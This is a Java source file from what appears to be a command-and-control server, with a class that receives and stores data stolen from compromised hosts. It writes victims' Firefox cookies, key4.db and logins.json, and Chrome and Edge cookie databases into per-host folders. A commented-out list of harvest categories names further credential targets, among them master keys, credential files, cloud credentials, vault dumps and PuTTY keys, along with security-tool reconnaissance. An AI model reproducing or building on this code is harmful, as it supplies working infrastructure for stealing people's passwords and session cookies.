package c2;

import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Date;

import c2.http.HTTPSManager;

public class HarvestProcessor {

	private String lz;

	public HarvestProcessor(String lz) {
		this.lz = lz;
	}

	public void receiveFirefoxCookies(String hostname, String username, byte[] content) {
		try {
			String baseDir = lz + File.separator + hostname + username + File.separator + "FirefoxMaterials";
			Files.createDirectories(Paths.get(baseDir));
			String filename = "cookies.sqlite";
			
			try (FileOutputStream outputStream = new FileOutputStream(baseDir + File.separator + filename)) {
			    outputStream.write(content);
			}
			
		} catch (IOException ex) {
			//TODO: Log
		}
	}
	
	public void receiveFirefoxLogins(String hostname, String username, byte[] keysDb, byte[] loginsJson) {
		try {
			String baseDir = lz + File.separator + hostname + username + File.separator + "FirefoxMaterials";
			Files.createDirectories(Paths.get(baseDir));
			String keysDbFilename = "key4.db";
			String loginsFilename = "logins.json";
			
			try (FileOutputStream outputStream = new FileOutputStream(baseDir + File.separator + keysDbFilename)) {
			    outputStream.write(keysDb);
			}
			
			try (FileOutputStream outputStream = new FileOutputStream(baseDir + File.separator + loginsFilename)) {
			    outputStream.write(loginsJson);
			}
			
		} catch (IOException ex) {
			//TODO: Log
		}
	}
	
	public void receiveChromeCookies(String hostname, String username, byte[] content) {
		try {
			String baseDir = lz + File.separator + hostname + username + File.separator + "ChromeMaterials";
			Files.createDirectories(Paths.get(baseDir));
			String filename = "cookies";
			
			try (FileOutputStream outputStream = new FileOutputStream(baseDir + File.separator + filename)) {
			    outputStream.write(content);
			}
			
		} catch (IOException ex) {
			//TODO: Log
		}
	}
	
	public void receiveEdgeCookies(String hostname, String username, byte[] content) {
		try {
			String baseDir = lz + File.separator + hostname + username + File.separator + "EdgeMaterials";
			Files.createDirectories(Paths.get(baseDir));
			String filename = "cookies";
			
			try (FileOutputStream outputStream = new FileOutputStream(baseDir + File.separator + filename)) {
			    outputStream.write(content);
			}
			
		} catch (IOException ex) {
			//TODO: Log
		}
	}

	public void processHarvest(String harvestHeader, String hostname, String pid, String username, String file) {
		try {
			String baseDir = lz + File.separator + hostname + pid + username;
			Files.createDirectories(Paths.get(baseDir));

			/*
			String filename = "default.txt";
			if (harvestHeader.equals("InterestingProcesses")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("NonStandardProcesses")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("Firefox")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("TokenGroupPrivs")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("LocalGroupMembers")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("RegistryAutoLogon")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("RegistryAutoRuns")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("UserEnvVariables")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("SystemEnvVariables")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("BasicOSInfo")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("UserFolders")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("PowerShellSettings")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("SysmonConfig")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("UACSystemPolicies")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("4624Events")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("4648Events")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("WEFSettings")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("RebootSchedule")) { // TODO: Reboot schedule reporting doesnt seem to work
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("RecycleBin")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("RecentFiles")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("NonstandardServices")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("RecentRunCommands")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("MappedDrives")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("WMIMappedDrives")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("NetworkShares")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("FirewallRules")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("ARPTable")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("AllTCPConnections")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("AllUDPConnections")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("RDPSessions")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("InternetSettings")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("LSASettings")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("LapsSettings")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("AuditSettings")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("CurrentDomainGroups")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("Patches")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("SavedRDPConnections")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("LogonSessions")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("MasterKeys")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("CredFiles")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("AntiVirusWMI")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("CloudCreds")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("PuttySSHHostKeys")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("DumpVault")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("TriageChrome")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("PuttySessions")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("IETabs")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("InterestingFiles")) {
				filename = harvestHeader + System.currentTimeMillis() + ".txt";
			} else if (harvestHeader.equals("Clipboard")) {
			*/
			String filename = harvestHeader + HTTPSManager.ISO8601_WIN.format(new Date()) + ".txt";
			//}

			try (FileWriter stream = new FileWriter(baseDir + File.separator + filename)) {
				stream.write(file.toString());
			}
		} catch (IOException ex) {
			ex.printStackTrace();
		}
	}
}
